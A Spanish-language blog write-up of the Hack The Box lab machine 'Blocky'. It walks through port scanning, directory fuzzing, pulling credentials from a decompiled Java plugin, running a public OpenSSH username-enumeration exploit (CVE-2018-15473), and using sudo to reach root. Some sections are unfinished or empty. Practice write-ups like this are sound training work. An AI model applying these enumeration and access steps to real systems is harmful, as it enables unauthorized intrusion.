---
layout: single
title: Blocky - Hack The Box
excerpt: "Esta es una máquina bastante sencilla, en donde haremos un Fuzzing y gracias a este descubriremos archivos de Java, que al descompilar uno de ellos contendrá información critica que nos ayudará a loguearnos como Root. Además de que aprendemos a enumerar los usuarios del servicio SSH, es decir, sabremos si estos existen o no en ese servicio gracias al Exploit CVE-2018-15473."
date: 2023-02-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-blocky/blocky_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Virtual Hosting
  - Fuzzing
  - Information Leakage
  - Java Decompiler 
  - SUDO Exploitation
  - SSH Username Enumeration
  - CVE-2018-15473
  - OSCP Style
---
![](/assets/images/htb-writeup-blocky/blocky_logo.png)

Esta es una máquina bastante sencilla, en donde haremos un **Fuzzing** y gracias a este descubriremos archivos de **Java**, que al descompilar uno de ellos contendrá información critica que nos ayudará a loguearnos como **Root**. Además de que aprendemos a enumerar los usuarios del servicio **SSH**, es decir, sabremos si estos existen o no en ese servicio gracias al Exploit **CVE-2018-15473**.

Herramientas utilizadas:
* **
* **
* **
* **
* **
* **


Cosas por hacer:
AGREGAR FUZZING CON GOBUSTER
USAR LA HERRAMIENTA WPSCAN

<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Puerto 80</a></li>
				<li><a href="#Fuzz">Fuzzing</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#SSH">Forma de Enumerar Usuarios de SSH</a></li>
				<ul>
                                        <li><a href="#PruebaExp">Probando Exploit: OpenSSH < 7.7 - Username Enumeration (2)</a></li>
                                </ul>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL veremos que SO ocupa dicha máquina.
```bash
ping -c 4 10.10.10.37                           
PING 10.10.10.37 (10.10.10.37) 56(84) bytes of data.
64 bytes from 10.10.10.37: icmp_seq=1 ttl=63 time=134 ms
64 bytes from 10.10.10.37: icmp_seq=2 ttl=63 time=135 ms
64 bytes from 10.10.10.37: icmp_seq=3 ttl=63 time=133 ms
64 bytes from 10.10.10.37: icmp_seq=4 ttl=63 time=133 ms

--- 10.10.10.37 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 132.548/133.548/134.989/0.910 ms
```
Ok, el TTL nos dice que es una máquina con Linux, hagamos los escaneos.

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.37 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 14:50 CST
Initiating SYN Stealth Scan at 14:50
Scanning 10.10.10.37 [65535 ports]
Discovered open port 21/tcp on 10.10.10.37
Discovered open port 80/tcp on 10.10.10.37
Discovered open port 22/tcp on 10.10.10.37
Discovered open port 25565/tcp on 10.10.10.37
Increasing send delay for 10.10.10.37 from 0 to 5 due to 11 out of 23 dropped probes since last increase.
Completed SYN Stealth Scan at 14:50, 42.20s elapsed (65535 total ports)
Nmap scan report for 10.10.10.37
Host is up, received user-set (0.40s latency).
Scanned at 2023-02-20 14:50:15 CST for 43s
Not shown: 65530 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   REASON
21/tcp    open  ftp       syn-ack ttl 63
22/tcp    open  ssh       syn-ack ttl 63
80/tcp    open  http      syn-ack ttl 63
25565/tcp open  minecraft syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 42.27 seconds
           Raw packets sent: 196623 (8.651MB) | Rcvd: 62 (2.724KB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay 4 puertos abiertos, 3 de ellos ya los conocemos, el **servicio FTP**, el **servicio SSH** y el **servicio HTTP**, pero...Minecraft? que curioso, veamos que nos dice el escaneo de servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sC -sV -p21,22,80,25565 10.10.10.37 -oN targeted                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 14:58 CST
Nmap scan report for 10.10.10.37
Host is up (0.13s latency).

PORT      STATE SERVICE   VERSION
21/tcp    open  ftp       ProFTPD 1.3.5a
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d62b99b4d5e753ce2bfcb5d79d79fba2 (RSA)
|   256 5d7f389570c9beac67a01e86e7978403 (ECDSA)
|_  256 09d5c204951a90ef87562597df837067 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Analizando lo que nos dio el escaneo, el **servicio FTP** no tiene activo el login **Anonymous**, por lo que no sirve tratar de entrar por ahí. No tenemos credenciales del **servicio SSH**, entonces tendremos que irnos por la página web del **servicio HTTP**.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Veamos que nos dice la página:

![](/assets/images/htb-writeup-blocky/Captura1.png)

Ok, parece ser que no podemos acceder a la página web, creo que ya sabemos que debemos hacer y que está pasando aquí. Estamos frente a un **Virtual Hosting** pues quiero pensar que cuando metemos la IP de la página, esta nos redirige hacia el puerto 25565, pero nuestra máquina no resuelve la IP con el dominio, por lo que hay que registrarlo.

Vamos a registrar el nombre del dominio como viene ahí, como **blocky.htb** en el fichero **hosts** del directorio **/etc**:
```bash
nano /etc/hosts 
10.10.10.37 blocky.htb
```
Bien, recarguemos la página a ver si ya funciona:

![](/assets/images/htb-writeup-blocky/Captura2.png)

Excelente, ya funciona. Que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura3.png">
</p>

Ok, la página esta hecha con **Wordpress**, **PHP** y ahí viene el servidor **Apache**. 

Veamos si la **herramienta whatweb** nos dice algo más:
```bash
whatweb http://10.10.10.37
http://10.10.10.37 [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.37], RedirectLocation[http://blocky.htb], Title[302 Found]
http://blocky.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.37], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[BlockyCraft &#8211; Under Construction!], UncommonHeaders[link], WordPress[4.8]
```
Observa que se realizo una redirección y nos llevo de la IP al dominio.

Y no hay nada nuevo que nos sirva por ahora.

Veamos que podemos hacer dentro de la página web.

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura4.png">
</p>

Ahí vemos un login y si damos click en **Comments** y **Entries**, nos descargara 2 archivos **XML**:
```bash
file JZsE-b6w                    
JZsE-b6w: XML 1.0 document, ASCII text
file OTX7NxW5 
OTX7NxW5: XML 1.0 document, Unicode text, UTF-8 text, with very long lines (302)
```
Los analice un poco rápido, pero no vi nada que nos pueda ayudar de momento, sigamos buscando.

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura5.png">
</p>

Vemos un post y podemos verlo mejor si damos click, entremos.

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura6.png">
</p>

Una vez dentro, podemos comentar también, pero lo importante es que arriba del post aparece un usuario llamado **notch**, supongo que ese debe estar registrado en la página. Vamos al login.

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura7.png">
</p>

Va, una vez aquí intentemos ver si existe el usuario notch:

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura8.png">
</p>

¡Si existe! Puede que ese usuario este registrado en el **SSH**, solo nos falta la contraseña. Ahora hagamos un Fuzzing para saber que otras subpáginas hay.

<h2 id="Fuzz">Fuzzing</h2>

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://blocky.htb/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://blocky.htb/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000000001:   200        313 L    3592 W     52224 Ch    "# directory-list-2.3-medium.txt"                                           
000000003:   200        313 L    3592 W     52224 Ch    "# Copyright 2007 James Fisher"                                             
000000007:   200        313 L    3592 W     52224 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
000000241:   200        0 L      0 W        0 Ch        "wp-content"                                                                
000000014:   301        0 L      0 W        0 Ch        "http://blocky.htb//"                                                       
000000519:   200        37 L     61 W       745 Ch      "plugins"                                                                   
000000010:   200        313 L    3592 W     52224 Ch    "#"                                                                         
000000012:   200        313 L    3592 W     52224 Ch    "# on atleast 2 different hosts"                                            
000000006:   200        313 L    3592 W     52224 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"             
000000008:   200        313 L    3592 W     52224 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                
000000013:   200        313 L    3592 W     52224 Ch    "#"                                                                         
000000009:   200        313 L    3592 W     52224 Ch    "# Suite 300, San Francisco, California, 94105, USA."                       
000000004:   200        313 L    3592 W     52224 Ch    "#"                                                                         
000000005:   200        313 L    3592 W     52224 Ch    "# This work is licensed under the Creative Commons"                        
000000002:   200        313 L    3592 W     52224 Ch    "#"                                                                         
000000011:   200        313 L    3592 W     52224 Ch    "# Priority ordered case sensative list, where entries were found"          
000000786:   200        200 L    2015 W     40838 Ch    "wp-includes"                                                               
000001073:   403        11 L     32 W       296 Ch      "javascript"                                                                
000000083:   403        11 L     32 W       291 Ch      "icons"                                                                     
000007180:   302        0 L      0 W        0 Ch        "wp-admin"                                                                  
000000190:   200        10 L     51 W       380 Ch      "wiki"                                                                      
000010825:   200        25 L     347 W      10304 Ch    "phpmyadmin"                                                                
000045240:   301        0 L      0 W        0 Ch        "http://blocky.htb//"                                                       
000095524:   403        11 L     32 W       299 Ch      "server-status"                                                             

Total time: 510.1105
Processed Requests: 220560
Filtered Requests: 220536
Requests/sec.: 432.3768
```

| Parámetros | Descripción |
|--------------------------|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

<br>

Bien, ahora probemos con Gobuster:
```bash
gobuster dir -u http://blocky.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blocky.htb/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/04/20 22:14:03 Starting gobuster in directory enumeration mode
===============================================================
/wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
/wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
/plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
/wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
/javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
/wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

<br>

Hay varios que podemos ver, el que me llama la atención es el **wp-includes**, veamos que hay ahí.

![](/assets/images/htb-writeup-blocky/Captura9.png)

Son varios archivos y la página es muy lenta cuando intentamos abrir algún archivo y cuando lo abrimos no hay nada, es decir, que no podemos ver el contenido de los archivos, pero si ver que existen.

Bueno veamos que hay en plugins.

![](/assets/images/htb-writeup-blocky/Captura10.png)

Ok, si les damos click a esos archivos se pueden descargar, pero... ¿qué es la extensión **.jar**?:

| **Archivos .jar** |
|:-----------:|
| *Un archivo JAR es un tipo de archivo que permite ejecutar aplicaciones y herramientas escritas en el lenguaje Java. Las siglas están deliberadamente escogidas para que coincidan con la palabra inglesa "jar". Los archivos JAR están comprimidos con el formato ZIP y cambiada su extensión a .jar.* |

<br>

Entonces, son **archivos comprimidos de Java**, tratemos de ver su interior. 

Para esto, es necesario descompilarlo porque no podremos abrir uno de estos archivos, a menos que tengamos **Java** para poder abrirlo y verlo y posiblemente este contenga una contraseña, entonces busquemos una herramienta para descompilar estos archivos.

<h2 id="Java">Analizando Archivo .jar</h2>

Encontre una:
* http://java-decompiler.github.io/

Bien, instalémosla en nuestro equipo:
```bash
apt install jd-gui
```
Una vez instalada, solo ponemos **jd-gui** para abrirla, así igual abrimos el **BurpSuite** solo poniendo el nombre en un terminal y yasta.

![](/assets/images/htb-writeup-blocky/Captura11.png)

Bien, como nos indica ahí, vamos a cargar los archivos, primero veamos el **BlockyCore.jar**:

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura12.png">
</p>

Si no mal recuerdo de mis autoclases de Java, el cuadro amarillo debe ser una clase, veamos que contenido tiene:

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura13.png">
</p>

En efecto, es una clase, veamos el contenido:

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura14.png">
</p>

Waos, ya tenemos un usuario y la contraseña del Root, quiza **notch** es el Root o no sé, hay que probarlo.

<h2 id="wpscan">Utilizando la Herramienta WPScan</h2>






<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="SSH">Forma de Enumerar Usuarios de SSH</h2>

Esta vez investigamos bien al encontrar un usuario, pero ¿cómo sabremos si existe un usuario en un **servicio SSH** en el futuro? Por ejemplo, en **Windows** podemos usar **Crackmapexec** para el servicio **SMB**, pero aquí eso no sirve, así que hay que buscar una manera.

Después de investigar un rato, gracias a **HackTricks** se puede enumerar los usuarios de un servicio **SSH** usando **Metasploit**, así que existe un Exploit que nos permita esto:

* https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh

Investigando un Exploit, encontré este:

* https://www.exploit-db.com/exploits/45233

Este nos sirve para la versión de SSH que esta usando la máquina, pues es **OpenSSH 7.2**. Busquémoslo con **Searchsploit**:

```bash
searchsploit OpenSSH 7.2           
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                   | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                             | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                            | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                    | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                       | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation       | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                   | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                       | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                      | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Incluso hay varias versiones, pero probemos el **Username Enumeration (2)** porque el que encontramos en internet no funciona.

<h3 id="PruebaExp">Probando Exploit: OpenSSH < 7.7 - Username Enumeration (2)</h3>

```bash
searchsploit -m linux/remote/45939.py
  Exploit: OpenSSH < 7.7 - Username Enumeration (2)
      URL: https://www.exploit-db.com/exploits/45939
     Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
    Codes: CVE-2018-15473
 Verified: False
File Type: Python script, ASCII text executable
```

Bien, analizándolo un poco, veo mucho que ocupa la librería **Paramiko**, vamos a instalarla:
```bash
pip install paramiko      
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality
...
```

Listo, ahora probemos si nos da indicaciones sobre cómo usarlo, usaremos Python 2 porque con los otros no quiso correr:
```bash
python2 SSH_Exploit.py
/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
usage: SSH_Exploit.py [-h] [-p PORT] target username

SSH User Enumeration by Leap Security (@LeapSecurity)

positional arguments:
  target                IP address of the target system
  username              Username to check for validity.

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Set port of SSH service
```
Ok, entonces hay que indicarle la IP de la máquina y el usuario, nos pide el puerto también, pero es opcional así que no lo pondré.

Usemos el Exploit:
```bash
python2 SSH_Exploit.py 10.10.10.37 notch   
/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
[+] notch is a valid username
```

PERFECTO! Ahí nos dice que **notch** si existe en esa máquina, pero no me gusta ese error que nos manda, quitémoslo para que solo se vea el resultado:
```bash
python2 SSH_Exploit.py 10.10.10.37 notch 2>/dev/null
[+] notch is a valid username
```
OK, ya nada más se ve el resultado.

Esta es una forma de saber si existe un usuario en un **servicio SSH**, para el futuro puede que nos sirva este Exploit.

<h2 id="SSH">Probando Contraseña Encontrada en Servicio SSH</h2>

Intentemos loguearnos con el usuario **notch**:
```bash
ssh notch@10.10.10.37       
notch@10.10.10.37's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:~$ whoami
notch
```

Vale somos **notch**, veamos que hay por aquí:
```bash
notch@Blocky:~$ ls -la
total 40
drwxr-xr-x 5 notch notch 4096 Jul  8  2022 .
drwxr-xr-x 3 root  root  4096 Jul  2  2017 ..
-rw------- 1 notch notch    1 Dec 24  2017 .bash_history
-rw-r--r-- 1 notch notch  220 Jul  2  2017 .bash_logout
-rw-r--r-- 1 notch notch 3771 Jul  2  2017 .bashrc
drwx------ 2 notch notch 4096 Jul  2  2017 .cache
drwxrwxr-x 7 notch notch 4096 Jul  2  2017 minecraft
drwxrwxr-x 2 notch notch 4096 Jul  2  2017 .nano
-rw-r--r-- 1 notch notch  655 Jul  2  2017 .profile
-r-------- 1 notch notch   33 Apr  4 15:48 user.txt
notch@Blocky:~$ cat user.txt
```
Excelente, ya tenemos la flag del usuario, ahora falta convertirnos en Root.

<h2 id="PHP">Ganando Acceso a Máquina Usando PHPMyAdmin</h2>

Si recuerdas, hay dos logins de PHP, pero la contraseña y el usuario que encontramos, sirven para el login de PHPMyAdmin, así que vamos a probarlas:

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura15.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-blocky/Captura16.png">
</p>


Excelente, dentro podemos ver que hay 




<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Enum">Enumeración de Máquina y Escalando Privilegios</h2>

Lo primero como siempre, vamos a ver que privilegios tenemos:
```bash
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Estamos en el grupo **SUDO**, vaya y si recordamos en el archivo **BlockyCore.jar**, la contraseña que usamos es la de Root, eso quiere decir que, si la volvemos a usar, seremos Root ¿no? Probemoslo:
```bash
notch@Blocky:~$ sudo su
[sudo] password for notch: 
root@Blocky:/home/notch# whoami
root
```

Changos, no pues si estuvo muy fácil, busquemos la flag del Root para terminal la máquina:
```bash
root@Blocky:/home/notch# cd /root
root@Blocky:~# ls
root.txt
root@Blocky:~# cat root.txt
```
¡Listo! Que cosa más fácil.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* http://java-decompiler.github.io/
* https://stackoverflow.com/questions/41305479/how-to-check-if-username-is-valid-on-a-ssh-server
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
* https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_enumusers/
* https://www.exploit-db.com/exploits/45233


<br>
# FIN
